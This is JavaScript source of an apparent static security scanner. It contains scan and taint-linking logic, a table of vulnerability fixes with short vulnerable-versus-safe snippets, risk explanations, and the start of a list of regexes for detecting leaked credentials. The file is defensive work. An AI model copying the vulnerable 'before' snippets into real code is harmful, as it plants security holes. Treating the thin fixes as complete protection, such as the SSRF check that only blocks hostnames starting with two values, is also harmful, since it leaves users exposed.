async function runFullScan({fileContents={}, depFileContents={}, scanRoot=null}, setProgress=()=>{}){_resetSuppressions();_buildProjectIndex(fileContents);await _loadCustomRules(scanRoot);const files=Object.keys(fileContents).filter(f=>shouldScan(f));const fc={},pfr={};const aR=[],aF=[],aSrc=[],aSink=[],aSan=[],aLogic=[],aSupply=[],aSecrets=[],aCiphersRest=[],aCiphersTransit=[];let i=0;for(const p of files){i++;setProgress({current:i,total:files.length,file:p.split("/").pop(),phase:"Scanning"});try{const c=fileContents[p];if(!c||c.length>500000)continue;const _avgLine=c.length/Math.max(c.split('\n').length,1);if(_avgLine>400&&c.length>10000)continue;fc[p]=c;aR.push(...scanRoutes(p,c));const ta=performAnalysis(p,c);pfr[p]=ta;aF.push(...ta.findings);aSrc.push(...ta.sources);aSink.push(...ta.sinks);aSan.push(...ta.sanitizers);aLogic.push(...scanLogicVulns(p,c));aSecrets.push(...scanCredentials(p,c));aF.push(...scanStructuralVulns(p,c));aF.push(...scanExtraStructural(p,c));aLogic.push(...scanReDoS(p,c));aLogic.push(...scanTodosNearSecurity(p,c));aSecrets.push(...scanEntropySecrets(p,c));const cp=scanCiphers(p,c);aCiphersRest.push(...cp.atRest);aCiphersTransit.push(...cp.inTransit);if(/\.(graphql|gql)$/i.test(p))aF.push(...scanGraphQL(p,c));aF.push(...scanIaC(p,c));}catch(_){}if(i%5===0)await new Promise(r=>setTimeout(r,0));}
  setProgress({current:i,total:files.length,file:"Cross-file...",phase:"Linking"});const ii=buildImportGraph(fc);const cf=crossFileTaint(pfr,fc,ii);aF.push(...cf);
  setProgress({current:i,total:files.length,file:"Stored taint...",phase:"Linking"});const storedRegistry=buildStoredTaintRegistry(fc);const stf=crossStoredTaint(fc,storedRegistry);aF.push(...stf);
  setProgress({current:i,total:files.length,file:"Session taint...",phase:"Linking"});const sess=crossSessionTaint(fc);aF.push(...sess);
  setProgress({current:i,total:files.length,file:"Call graph...",phase:"Linking"});const callGraph=buildCallGraph(fc);
  setProgress({current:i,total:files.length,file:"Reachability + guards...",phase:"Linking"});annotateReachability(aF,aR,callGraph,fc);aF.forEach(f=>detectGuardsForFinding(f,fc));
  setProgress({current:i,total:files.length,file:"Inferring sanitizers...",phase:"Linking"});const learned=inferSanitizers(fc);applyLearnedSanitizers(aF,learned,fc);
  setProgress({current:i,total:files.length,file:"Sanitizer effectiveness...",phase:"Linking"});applySanitizerEffectiveness(aF);
  setProgress({current:i,total:files.length,file:"Exploit chains...",phase:"Linking"});const chains=crossFindingChain(aF);aF.push(...chains);
  setProgress({current:i,total:files.length,file:"Config file cross-ref...",phase:"Linking"});aLogic.push(...scanConfigFiles(fc));
  setProgress({current:i,total:files.length,file:"OSV vulnerability database...",phase:"SCA"});
  const allFileContents={...fc, ...depFileContents};
  const components=parseManifests(allFileContents);
  const reach=buildReachabilitySet(fc);
  const reachabilitySet=reach.imported;
  components.forEach(c=>{c.reachable=reachabilitySet.has(c.name.toLowerCase())||(c.ecosystem==='pypi'&&reachabilitySet.has(c.name.replace(/-/g,'_').toLowerCase()));});
  let supplyChain=[];try{supplyChain=await queryOSV(components,allFileContents);}catch(_){supplyChain=[];}
  // Feat-9: enrich SCA findings with EPSS exploit-probability scores
  try{supplyChain=await _enrichWithEPSS(supplyChain);}catch(_){}
  try{markUsedVulnFunctions(supplyChain,fc);}catch(_){}
  setProgress({current:i,total:files.length,file:"Registry metadata...",phase:"SCA"});
  let registryInfo=new Map();try{registryInfo=await queryRegistries(components);}catch(_){}
  const dd=(a,k)=>[...new Map(a.map(x=>[k(x),x])).values()];
  // Sort findings: critical first, then structural patterns last within same severity
  aF.sort((a,b)=>({critical:0,high:1,medium:2,low:3}[a.severity]??4)-({critical:0,high:1,medium:2,low:3}[b.severity]??4));
  const vulnsByKey={};for(const sc of supplyChain.filter(s=>s.type==='vulnerable_dep')){const k=`${sc.ecosystem}:${sc.name}:${sc.version}`;if(!vulnsByKey[k])vulnsByKey[k]=[];vulnsByKey[k].push(sc);}
  const exploitResult=computeExploitPathComponents(aF,components,reach.byFile);
  for(const[key,paths]of exploitResult.pathsByKey){const[eco,name,...vp]=key.split(':');const ver=vp.join(':');for(const f of paths){if(!f.linkedComponents)f.linkedComponents=[];if(!f.linkedComponents.some(c=>c.name===name&&c.ecosystem===eco))f.linkedComponents.push({ecosystem:eco,name,version:ver});}}
  const annotatedComponents=components.map(c=>{const key=`${c.ecosystem}:${c.name}:${c.version}`;const vulns=vulnsByKey[key]||[];const ri=registryInfo.get(`${c.ecosystem}:${c.name}`)||{};const latestVersion=ri.latestVersion||'';const vd=(ri.versions||{})[c.version]||{};const isDeprecated=typeof vd.deprecated==='string'&&vd.deprecated.length>0;const deprecationMessage=isDeprecated?vd.deprecated:'';const license=ri.license||vd.license||'';return{...c,vulns,hasVulns:vulns.length>0,hasExploit:exploitResult.flagged.has(key),exploitPaths:exploitResult.pathsByKey.get(key)||[],latestVersion,isDeprecated,deprecationMessage,license};});
  let finalFindings;try{finalFindings=dedupeFindingsWithEvidence(aF);}catch(_){finalFindings=dd(aF,f=>f.id);}
  try{finalFindings.forEach(scoreExploitability);}catch(_){}
  finalFindings.sort((a,b)=>(b.exploitabilityScore||0)-(a.exploitabilityScore||0)||({critical:0,high:1,medium:2,low:3}[a.severity]??4)-({critical:0,high:1,medium:2,low:3}[b.severity]??4));
  classifyOrphans(aSrc,aSink,finalFindings,fc);
  return{routes:dd(aR,r=>`${r.method}:${r.path}:${r.file}:${r.line}`),findings:finalFindings,sources:aSrc,sinks:aSink,sanitizers:aSan,filesScanned:files.length,crossFileCount:cf.length,logicVulns:aLogic,supplyChain,components:annotatedComponents,secrets:aSecrets,ciphers:{atRest:aCiphersRest,inTransit:aCiphersTransit},pfr,fc,suppressions:_getSuppressions()};}

// Post-aggregation classification: every source becomes "unsafe"|"safe"; every sink becomes "confirmed"|"safe".
// Orphans (no finding linkage) are bucketed by file-local heuristic so the UI shows binary states only.
function classifyOrphans(sources,sinks,findings,fc){
  const unsanKeys=new Set(),sanKeys=new Set(),cfKeys=new Set();
  for(const f of findings){
    if(f.source){const k=`${f.source.label}:${f.source.file}:${f.source.line}`;(f.isSanitized?sanKeys:unsanKeys).add(k);}
    if(f.sink)cfKeys.add(`${f.file}::${f.sink.line}::${f.sink.type}`);
  }
  // Per-file indices
  const sinkVarsByFile=new Map(),sinkTextByFile=new Map(),srcVarsByFile=new Map(),globalSinkVars=new Set();
  for(const sk of sinks){
    if(!sinkVarsByFile.has(sk.file))sinkVarsByFile.set(sk.file,new Set());
    if(!sinkTextByFile.has(sk.file))sinkTextByFile.set(sk.file,'');
    const set=sinkVarsByFile.get(sk.file);
    for(const v of (sk.usedVars||[])){set.add(v);globalSinkVars.add(v);}
    sinkTextByFile.set(sk.file,sinkTextByFile.get(sk.file)+'\n'+(sk.snippet||'')+' '+(sk.args||''));
  }
  for(const s of sources){
    if(!s.variable)continue;
    if(!srcVarsByFile.has(s.file))srcVarsByFile.set(s.file,new Set());
    srcVarsByFile.get(s.file).add(s.variable);
  }
  // Sources
  for(const s of sources){
    const k=`${s.label}:${s.file}:${s.line}`;
    if(unsanKeys.has(k)){s.flowStatus='unsafe';continue;}
    if(sanKeys.has(k)){s.flowStatus='safe';s.flowSubtype='Sanitized Path';continue;}
    if(!s.variable){s.flowStatus='safe';s.flowSubtype='Whole-Object Access (Unused)';continue;}
    const fileSinkVars=sinkVarsByFile.get(s.file);
    if(fileSinkVars&&fileSinkVars.has(s.variable)){s.flowStatus='unsafe';s.flowSubtype='Linkage Inferred';continue;}
    const sinkText=sinkTextByFile.get(s.file)||'';
    if(sinkText.length>0&&sinkText.length<50000){
      try{if(new RegExp(`\\b${s.variable.replace(/[.*+?^${}()|[\\]\\\\]/g,'\\$&')}\\b`).test(sinkText)){s.flowStatus='unsafe';s.flowSubtype='Linkage Inferred';continue;}}catch(_){}
    }
    if(globalSinkVars.has(s.variable)){s.flowStatus='unsafe';s.flowSubtype='Cross-File Linkage Inferred';continue;}
    s.flowStatus='safe';s.flowSubtype='Unreachable';
  }
  // Sinks
  for(const sk of sinks){
    if(sk.severity==='info'){sk.riskStatus='safe';sk.riskSubtype='Secure Pattern';continue;}
    const k=`${sk.file}::${sk.line}::${sk.type}`;
    if(cfKeys.has(k)){sk.riskStatus='confirmed';continue;}
    const fileSrcVars=srcVarsByFile.get(sk.file);
    const used=sk.usedVars||[];
    if(fileSrcVars&&used.some(v=>fileSrcVars.has(v))){sk.riskStatus='confirmed';sk.riskSubtype='Linkage Inferred';continue;}
    sk.riskStatus='safe';sk.riskSubtype='No User Input';
  }
}
function computeDiff(o,n){const oI=new Set(o.findings.map(f=>f.vuln+":"+f.file+":"+f.source?.line));const nI=new Set(n.findings.map(f=>f.vuln+":"+f.file+":"+f.source?.line));const oR=new Set(o.routes.map(r=>r.method+":"+r.path));const nR=new Set(n.routes.map(r=>r.method+":"+r.path));return{newFindings:n.findings.filter(f=>!oI.has(f.vuln+":"+f.file+":"+f.source?.line)),fixedFindings:o.findings.filter(f=>!nI.has(f.vuln+":"+f.file+":"+f.source?.line)),newRoutes:n.routes.filter(r=>!oR.has(r.method+":"+r.path)),removedRoutes:o.routes.filter(r=>!nR.has(r.method+":"+r.path)),oldTotal:o.findings.filter(f=>f.severity!=="info").length,newTotal:n.findings.filter(f=>f.severity!=="info").length};}

const FIXES={"SQL Injection":{p:"Critical",f:"Use parameterized queries.",c:"db.query('SELECT * FROM users WHERE id=$1',[id]);"},"XSS":{p:"Critical",f:"Encode output.",c:"el.textContent = userInput;"},"Command Injection":{p:"Critical",f:"Use execFile with args array.",c:"execFile('ping',['-c','1',host]);"},"Path Traversal":{p:"High",f:"Validate paths with path.resolve.",c:"const safe=path.resolve('./uploads',file);\nif(!safe.startsWith(path.resolve('./uploads'))) throw 403;"},"SSRF":{p:"High",f:"Allowlist URLs.",c:"if(['127.0.0.1','169.254.169.254'].some(b=>url.hostname.startsWith(b))) return res.status(400);"},"Code Injection":{p:"Critical",f:"Never eval() user input.",c:"// Use safe parser"},"Open Redirect":{p:"Medium",f:"Allowlist redirects.",c:"if(allowed.includes(next)) res.redirect(next);"},"SSTI":{p:"High",f:"Auto-escape templates.",c:"// Use escaped output tags"},"Insecure Deserialization":{p:"Critical",f:"Use JSON, validate.",c:"data=JSON.parse(input);"},"Reflected XSS":{p:"High",f:"Encode before reflecting.",c:"res.send(escapeHtml(input));"},"DOM XSS":{p:"Critical",f:"Use textContent.",c:"el.textContent=input;"},"Data Exposure":{p:"Medium",f:"Use httpOnly cookies.",c:"res.cookie('t',token,{httpOnly:true,secure:true});"},"Mass Assignment":{p:"High",f:"Allowlist specific fields. Never pass entire request body to model create/update.",c:"// BEFORE (vulnerable)\nObject.assign(user, req.body);\nUser.create(req.body);\n\n// AFTER (safe)\nconst { name, email } = req.body;\nUser.create({ name, email });"},"IDOR":{p:"High",f:"Add ownership verification. Never trust user-supplied IDs without checking the authenticated user owns the resource.",c:"// BEFORE (vulnerable)\nconst item = await Item.findById(req.params.id);\n\n// AFTER (safe)\nconst item = await Item.findOne({\n  _id: req.params.id,\n  owner: req.user.id\n});\nif (!item) return res.status(404).send();"},"Prototype Pollution":{p:"Critical",f:"Never merge user input into objects. Sanitize keys to block __proto__, constructor, prototype.",c:"// BEFORE\n_.merge(config, req.body);\n\n// AFTER\nfunction safeMerge(t, s) {\n  for (const k of Object.keys(s)) {\n    if (['__proto__','constructor','prototype'].includes(k)) continue;\n    t[k] = s[k];\n  }\n}"},"XSS (Supply Chain)":{p:"High",f:"Update library. Pipe output through DOMPurify. Use .text() not .html() for user content.",c:"// marked\nconst html = DOMPurify.sanitize(marked.parse(userInput));\n\n// jQuery\n$('#el').text(userInput); // not .html()"},"Unsafe Deserialization (Supply Chain)":{p:"Critical",f:"Use yaml.safe_load or yaml.load with SafeLoader. Never yaml.load on user input.",c:"# BEFORE\ndata = yaml.load(request.data)\n\n# AFTER\ndata = yaml.safe_load(request.data)"},"ReDoS (Supply Chain)":{p:"Medium",f:"Limit input length before glob/regex. Use re2 for safe regex.",c:"if (input.length > 200) return res.status(400).send();\nconst matches = minimatch(file, pattern);"},"ReDoS":{p:"High",f:"Never build RegExp from user input. Use re2 or validate pattern.",c:"// BEFORE\nnew RegExp(req.query.pattern);\n\n// AFTER\nconst RE2 = require('re2');\nconst re = new RE2(req.query.pattern);"},"JWT Algorithm Confusion":{p:"High",f:"Always specify allowed algorithms in jwt.verify options.",c:"// BEFORE\njwt.verify(token, secret);\n\n// AFTER\njwt.verify(token, secret, { algorithms: ['HS256'] });"},"XSS (serialize-javascript)":{p:"High",f:"Update serialize-javascript >= 3.1.0.",c:"npm install serialize-javascript@latest"},"SQL Injection (Template Literal)":{p:"Critical",f:"Use parameterized queries.",c:"db.query('SELECT * WHERE id=$1',[id]);"},"SQL Injection (Concatenation)":{p:"Critical",f:"Use parameterized queries.",c:"db.query('SELECT * WHERE id=$1',[id]);"},"JWT Decoded Without Signature Verification":{p:"Critical",f:"Use jwt.verify() with algorithm pinning.",c:"jwt.verify(token, secret, { algorithms: ['HS256'] });"},"JWT 'none' Algorithm (Auth Bypass)":{p:"Critical",f:"Never allow 'none' algorithm.",c:"jwt.verify(token, secret, { algorithms: ['RS256','HS256'] });"},"Reflected XSS (User Input in Response)":{p:"High",f:"Encode output with escapeHtml().",c:"res.send(escapeHtml(req.query.input));"},"Angular DomSanitizer Bypass (XSS)":{p:"Critical",f:"Remove bypassSecurityTrust* calls.",c:"// Use DomSanitizer.sanitize(SecurityContext.HTML, value) instead"},"Angular nativeElement.innerHTML (XSS)":{p:"Critical",f:"Use textContent or Angular bindings.",c:"el.nativeElement.textContent = safeValue;"},"Path Traversal (User-Controlled Path)":{p:"High",f:"Validate path is within allowed dir.",c:"const safe=path.resolve('./uploads',file);\nif(!safe.startsWith(path.resolve('./uploads')))throw 403;"},"Open Redirect (User-Controlled URL)":{p:"High",f:"Allowlist redirect targets.",c:"if(!ALLOWED.includes(next))return res.status(400).send();\nres.redirect(next);"},"SSRF (User-Controlled Request URL)":{p:"High",f:"Allowlist outbound URLs.",c:"if(isPrivateIP(url))return res.status(400).send();"},"Mass Assignment (req.body Direct to Model)":{p:"High",f:"Allowlist specific fields.",c:"const{name,email}=req.body;\nUser.create({name,email});"},"Potential IDOR (User-Controlled ID)":{p:"High",f:"Verify ownership before access.",c:"const item=await Model.findOne({_id:req.params.id,owner:req.user.id});"},"Error/Stack Trace Exposed to Client":{p:"Medium",f:"Return generic errors to clients.",c:"res.status(500).json({error:'Internal server error'});"},"Weak/Hardcoded Session Secret":{p:"High",f:"Use random secret from env.",c:"session({ secret: process.env.SESSION_SECRET })"},"VM Sandbox Execution (RCE Risk)":{p:"Critical",f:"Never execute user code via vm.",c:"// Use a sandboxed parser (e.g. acorn) instead of vm.runInContext"},"Command Injection (User-Controlled Input)":{p:"Critical",f:"Use execFile with arg array.",c:"execFile('ping',[host])"},"Unsafe Deserialization (User-Controlled JSON)":{p:"High",f:"Validate with schema before parsing.",c:"const parsed=schema.parse(JSON.parse(input));"},"Unsafe XML Parsing (XXE Risk)":{p:"High",f:"Disable external entities.",c:"xml2js.parseString(xml,{explicitCharkey:false},(err,r)=>{})"},"File Upload Handler (Verify MIME/Extension/Size)":{p:"Medium",f:"Validate file type, size.",c:"if(!ALLOWED_TYPES.includes(file.mimetype))return res.status(400).send();"},"NoSQL Injection":{p:"High",f:"Cast and validate query parameters.",c:"const id=mongoose.Types.ObjectId(req.params.id);"},"Server-Side Template Injection":{p:"High",f:"Never compile user input as templates.",c:"// Use static template files; pass data as context variables only"},"Log Injection (Unsanitized User Input Logged)":{p:"Medium",f:"Sanitize values before logging.",c:"logger.info('Search:',{q:req.query.q?.substring(0,100)});"},"Auth Endpoint Without Rate Limiting":{p:"Medium",f:"Apply rate limiting to auth endpoints.",c:"app.use('/login',rateLimit({windowMs:15*60*1000,max:10}));"},"Admin Route (Verify Auth)":{p:"High",f:"Protect admin routes.",c:"router.use('/admin',requireRole('admin'));"},"Full User Object Exposed in Response":{p:"High",f:"Return only needed fields.",c:"const{password,...safe}=user.toJSON();\nres.json(safe);"},"Cryptographically Weak PRNG (Math.random)":{p:"High",f:"Use crypto.randomBytes.",c:"const token=crypto.randomBytes(32).toString('hex');"},"MD5/SHA1 Password Hashing":{p:"Critical",f:"Use bcrypt or argon2.",c:"const hash=await bcrypt.hash(password,12);"},"Cookie Set (Verify httpOnly/Secure/SameSite)":{p:"Medium",f:"Set security flags on cookies.",c:"res.cookie('token',val,{httpOnly:true,secure:true,sameSite:'strict'});"}};

// ─── FIXES for new vuln types ────────────────────────────────────────────────
const NEW_FIXES={
  "Race Condition — Financial Double-Spend":{p:"High",f:"Wrap read-check-write in a DB transaction with SELECT FOR UPDATE.",c:"await sequelize.transaction(async t => {\n  const w = await Wallet.findOne({ where:{userId}, lock:true, transaction:t });\n  if(w.balance < amount) throw new Error('Insufficient');\n  await w.decrement('balance', { by:amount, transaction:t });\n});"},
  "Sensitive Account Mutation Without Re-Authentication":{p:"High",f:"Require currentPassword or MFA verification before allowing email/password/role changes.",c:"const valid = await bcrypt.compare(req.body.currentPassword, user.password);\nif (!valid) return res.status(403).json({ error: 'Re-authentication required' });"},
  "Account Enumeration via Differentiated Error":{p:"Medium",f:"Return identical 401 responses for both 'user not found' and 'wrong password' cases.",c:"if (!user || !await bcrypt.compare(password, user.password))\n  return res.status(401).json({ error: 'Invalid credentials' });"},
  "Timing Oracle — Non-Constant-Time Secret Comparison":{p:"Medium",f:"Use crypto.timingSafeEqual() for all secret/token comparisons.",c:"const a=Buffer.from(provided||'');\nconst b=Buffer.from(process.env.SECRET||'');\nif(a.length!==b.length||!crypto.timingSafeEqual(a,b)) return res.status(401);"},
  "Missing Positive-Integer Validation on Financial Field":{p:"Medium",f:"Validate financial/quantity fields are positive integers before processing.",c:"if(!Number.isInteger(qty)||qty<1||qty>10000) return res.status(400).json({error:'Invalid quantity'});"},
  "Stored XSS / Second-Order Injection":{p:"High",f:"Sanitize stored user content before rendering. Use DOMPurify or escapeHtml on output — not just on input.",c:"// On render:\nres.send(`<td>${escapeHtml(user.bio)}</td>`);\n// Or: store pre-sanitized with DOMPurify on ingestion"},
  "Potential Indirect IDOR — findAll Without Ownership Scope":{p:"High",f:"Always include the authenticated user's ID in collection query where clauses.",c:"const items = await Item.findAll({ where: { userId: req.user.id } });"},
  "Type Confusion — JSON.parse of Auth Header (Trust Without Verification)":{p:"Critical",f:"Use jwt.verify() with algorithm pinning. Never JSON.parse auth headers directly.",c:"const payload = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });"},
  "Mass Assignment to Global Application State":{p:"Critical",f:"Never merge user-controlled objects into app.locals or process.env.",c:"// Only set specific keys:\napp.locals.theme = req.body.theme; // safe\n// NOT: Object.assign(app.locals, req.body); // unsafe"},
  "GraphQL Introspection Enabled (Schema Exposure)":{p:"Medium",f:"Disable introspection in production.",c:"new ApolloServer({ introspection: process.env.NODE_ENV !== 'production' })"},
  "GraphQL Playground Enabled (Unauthenticated Schema Browser)":{p:"Medium",f:"Disable playground in production environments.",c:"new ApolloServer({ playground: process.env.NODE_ENV !== 'production' })"},
  "GraphQL Missing Query Depth/Complexity Limit (DoS Risk)":{p:"Medium",f:"Add depth and complexity limits to prevent nested query DoS.",c:"const depthLimit = require('graphql-depth-limit');\nnew ApolloServer({ validationRules: [depthLimit(7)] })"},
  "OAuth CSRF — Missing state Parameter":{p:"High",f:"Generate and validate a cryptographically random state parameter on every OAuth flow.",c:"const state = crypto.randomBytes(16).toString('hex');\nreq.session.oauthState = state;\npassport.authenticate('github', { scope: ['user'], state })(req, res, next);"},
  "OAuth Callback Without state Validation (Authorization Code Injection)":{p:"High",f:"Validate state parameter on callback before exchanging the code.",c:"if(req.query.state !== req.session.oauthState) return res.status(403).send('CSRF detected');"},
  "Password Reset Token Oracle (Enumeration via Status Code)":{p:"Medium",f:"Return identical responses for valid and invalid tokens.",c:"// Always return 200 with generic message:\nres.json({ message: 'If that token is valid, your password has been reset.' });"},
  "GraphQL Mutation Block (Verify Field-Level Auth)":{p:"Medium",f:"Add authentication checks to every mutation resolver.",c:"Mutation: {\n  updateUser: (_, args, ctx) => {\n    if (!ctx.user) throw new AuthenticationError('Login required');\n  }\n}"},
  "GraphQL Sensitive Query Field (Verify Auth)":{p:"Medium",f:"Add field-level authorization to sensitive GraphQL query fields.",c:"type Query {\n  adminUsers: [User] @auth(requires: ADMIN)\n}"},
};
// Merge new fixes into FIXES
Object.assign(FIXES, NEW_FIXES);

// Chain finding fix entries
for(const rule of CHAIN_RULES){
  if(!FIXES[rule.combined]){
    FIXES[rule.combined]={p:"Critical",f:"Address the underlying component vulnerabilities and test for exploit chains.",c:`// Resolve both:\n// 1. ${rule.a}\n// 2. ${rule.b}`};
  }
}

const SINK_RISK_REASONS={
  "Database Query":"SQL/NoSQL queries built with string concatenation let attackers alter the query's logic, bypassing authentication, reading other users' data, or deleting records.",
  "DOM Write":"Setting innerHTML with user-controlled data injects arbitrary HTML and JavaScript into the page. The browser executes it immediately, giving an attacker full control of the victim's session.",
  "React Unsafe HTML":"dangerouslySetInnerHTML explicitly bypasses React's XSS protection. Any unsanitized string passed here executes as live HTML in the browser.",
  "OS Command":"Shell commands constructed from user input let an attacker run arbitrary operating system commands on the server with the process's full privileges.",
  "Redirect":"User-controlled redirect targets send victims to attacker-owned sites. This enables phishing, OAuth token theft, and credential harvesting under your domain's trust.",
  "File Op":"User-supplied file paths can include '../' sequences to escape the intended directory and read or overwrite arbitrary files, including source code, credentials, and config.",
  "Code Eval":"eval() or new Function() with user input executes arbitrary JavaScript. On Node.js this is remote code execution, full server compromise with one request.",
  "HTTP Response":"Every place the app writes unsanitized user input into an HTTP response is a reflection point. If a browser renders it, the attacker's script runs in the victim's session.",
  "Template Render":"Passing user input as template source code, not as template data, injects template directives that execute server-side with full application context (SSTI).",
  "Deserialization":"Unsafe deserialization of attacker-controlled bytes triggers arbitrary code execution through gadget chains, before any application logic can inspect the data.",
  "Outbound HTTP":"User-controlled URLs in outbound requests probe internal services, reach cloud metadata endpoints (169.254.169.254), or exfiltrate data to attacker infrastructure (SSRF).",
  "Client Storage":"localStorage/sessionStorage are readable by any JavaScript on the same origin. Sensitive data stored here is exposed to XSS payloads and browser extensions.",
  "Object Merge":"Merging user-controlled objects without filtering __proto__ keys poisons the prototype chain shared by every object in the process.",
  "Model Write":"Passing the raw request body to an ORM create/update call lets attackers set fields the application never intended to be user-controlled, such as isAdmin or role.",
  "Direct Lookup":"Fetching a record by a user-supplied ID without verifying ownership lets any authenticated user read any other user's data (IDOR, Insecure Direct Object Reference).",
  "ID Lookup":"Direct ID-based lookups without ownership checks enable IDOR. Attacker increments the ID to enumerate and access records they don't own.",
  "ID Mutation":"Update and delete operations keyed only by a user-supplied ID allow attackers to modify or destroy any record in the store, not just their own.",
  "Prototype Pollution (lodash)":"Lodash merge/extend with user-controlled objects writes to __proto__, poisoning the prototype chain and potentially enabling privilege escalation across all objects.",
  "Deep Merge":"Deep object merges with user-controlled keys can set __proto__ properties, corrupting the prototype chain shared by the entire application.",
  "jQuery DOM (CVE-2020-11022)":"jQuery .html()/.append() pass strings through HTML parsing. User-controlled content becomes live, executable HTML, classic XSS via a supply chain sink.",
  "Dynamic RegExp":"RegExp built from user input can trigger catastrophic backtracking. A crafted string can consume 100% CPU and deny service to all concurrent requests (ReDoS).",
  "JWT Verify (no algo)":"Calling jwt.verify() without an explicit algorithms list permits the 'none' algorithm bypass (no signature needed) and RS/HS key confusion attacks.",
  "VM Sandbox":"Node.js vm is not a security boundary. Code in a vm context can escape to the outer process through prototype chain manipulation, it provides no real isolation.",
  "Weak Hash":"MD5 and SHA1 are cryptographically broken. Password hashes computed with either algorithm can be reversed with rainbow tables in seconds on consumer hardware.",
  "Angular Trust Bypass":"bypassSecurityTrust* explicitly disables Angular's XSS sanitization for the affected value. Any unsanitized user input reaching this call executes in the browser.",
  "Angular DOM Write":"Direct nativeElement.innerHTML assignment bypasses Angular's template sanitizer, creating an unconditional XSS sink.",
  "Header Injection":"Unsanitized CRLF characters in header values allow injecting additional HTTP headers or splitting the response, enabling cache poisoning and session fixation.",
  "Process Fork":"child_process.fork() with user-controlled arguments is functionally equivalent to command injection at the operating system level.",
  "NoSQL Operator":"MongoDB operators ($where, $gt, $in) embedded in user input alter query semantics, bypassing authentication or exposing data the query was never meant to return.",
  "Template Engine":"Template engines compiled with user-controlled strings execute server-side with full process access, this is SSTI, which routinely leads to RCE.",
  "Response Splitting":"CRLF injection in response headers lets attackers inject arbitrary HTTP headers or body content, enabling cache poisoning and response smuggling.",
  "Proto Manipulation":"Object.defineProperty/setPrototypeOf with user-controlled targets can override built-in methods or introduce privilege escalation paths through the prototype chain.",
  "JWT Sign with User Data":"Including unvalidated user claims in a JWT payload allows privilege escalation, the attacker sets their own role or isAdmin flag and the token is signed by the server.",
  "Bulk Data Exposure":"Returning raw ORM query results exposes every column, including password hashes, internal IDs, and PII that should never leave the server layer.",
  "Stored Sink":"User input was stored in the database without sanitization and is later rendered in a response without encoding. Unlike reflected XSS which requires tricking a victim into clicking a link, stored XSS fires automatically when any user views the affected page.",
  "Chained Exploit":"Two individually lower-severity findings combine to form a complete exploit chain. The composite attack surface is greater than the sum of its parts — address both root vulnerabilities.",
  "Type Confusion Deserialization":"Parsing and trusting a client-supplied base64 or JSON payload for auth decisions bypasses all server-side session management. The client sets their own role or identity claims.",
  "Global State Pollution":"Merging user-controlled objects into app.locals or process.env overwrites application-level configuration and secrets. This can disable security controls or expose credentials to subsequent requests.",
  "GraphQL":"GraphQL endpoints expose powerful query capabilities. Missing auth, depth limits, or enabled introspection allows schema enumeration, nested query DoS, and unauthorized data access.",
  "OAuth Config":"Misconfigured OAuth flows allow authorization code interception (CSRF), account linking hijacking, and token theft. The state parameter is the primary CSRF defense.",
  "Auth Oracle":"Returning different HTTP status codes or messages for valid vs. invalid accounts reveals which email addresses are registered. Attackers use this for targeted phishing and credential stuffing.",
  "Potential Indirect IDOR":"A collection query (findAll/findMany) without an ownership constraint returns records for all users. Any authenticated user can read the full dataset by calling this endpoint.",

  "Safe YAML":"yaml.safe_load() uses Python's SafeLoader which prohibits object instantiation from YAML data. This is the correct, secure pattern for parsing untrusted YAML.",
  "Safe JWT":"jwt.verify() with an explicit algorithms array prevents algorithm confusion attacks. Pinning to HS256 or RS256 fully closes the 'none' algorithm bypass."
};

const SINK_SAFE_REASONS={
  "Safe YAML":"yaml.safe_load() correctly uses Python's SafeLoader, which prohibits class instantiation from YAML. This prevents deserialization RCE. No action needed — this is the secure pattern.",
  "Safe JWT":"jwt.verify() is called with an explicit algorithms array. Algorithm pinning closes the 'none' algorithm bypass and RS/HS confusion attacks. No action needed — this is the secure pattern.",
  "YAML SafeLoad":"yaml.safe_load() uses SafeLoader — the secure, restricted YAML parser. No action needed.",
  "JWT Verify":"jwt.verify() with pinned algorithms — the token signature is validated before use. No action needed."
};

const CREDENTIAL_PATTERNS=[
  // Cloud / Infrastructure
  // flags:"g" = case-sensitive (real AWS keys are always uppercase); lookbehind/ahead prevent matching inside camelCase identifiers
  {n:"AWS Access Key ID",r:"(?<![A-Z0-9])(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}(?![A-Z0-9])",s:"c",flags:"g"},
  {n:"AWS AppSync GraphQL Key",r:"da2-[a-z0-9]{26}",s:"h"},
  {n:"Amazon MWS Auth Token",r:"amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",s:"h"},
  {n:"Google API Key",r:"AIza[0-9A-Za-z\\-_]{35}",s:"h"},
  {n:"Google OAuth Access Token",r:"ya29\\.[0-9A-Za-z\\-_]{20,}",s:"h"},
  {n:"Google OAuth Client ID",r:"[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",s:"m"},
  // Downgraded from critical: pattern matches JSON structure, not the key bytes themselves
  {n:"GCP Service Account Credential",r:"\"type\":\\s*\"service_account\"",s:"h"},
  // Tightened: replaced .* with .{0,30} to prevent long-range matches
  {n:"Heroku API Key",r:"(?:heroku|HEROKU).{0,30}[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",s:"h"},
  {n:"Dynatrace Token",r:"dt0[a-zA-Z]{1}[0-9]{2}\\.[A-Z0-9]{24}\\.[A-Z0-9]{64}",s:"h"},
  // Version Control
  {n:"GitHub Personal Access Token",r:"ghp_[0-9a-zA-Z]{36}",s:"c"},
  {n:"GitHub OAuth Access Token",r:"gho_[0-9a-zA-Z]{36}",s:"c"},
  {n:"GitHub App Token",r:"(ghu|ghs)_[0-9a-zA-Z]{36}",s:"c"},
  {n:"GitHub Refresh Token",r:"ghr_[0-9a-zA-Z]{76}",s:"c"},
  // Payments
  {n:"Stripe Secret Key",r:"sk_live_[0-9a-zA-Z]{24}",s:"c"},
  {n:"Stripe Restricted Key",r:"rk_live_[0-9a-zA-Z]{24}",s:"h"},
  // Lowered to medium: test keys appear legitimately in test files/docs
  {n:"Stripe Test Key",r:"sk_test_[0-9a-zA-Z]{24}",s:"m"},
  {n:"PayPal Braintree Access Token",r:"access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}",s:"c"},
  {n:"Square Access Token",r:"sq0atp-[0-9A-Za-z\\-_]{22}",s:"c"},
  {n:"Square OAuth Secret",r:"sq0csp-[0-9A-Za-z\\-_]{43}",s:"h"},
  // Messaging / Communication
  // Fixed: removed optional group (?), body is now required
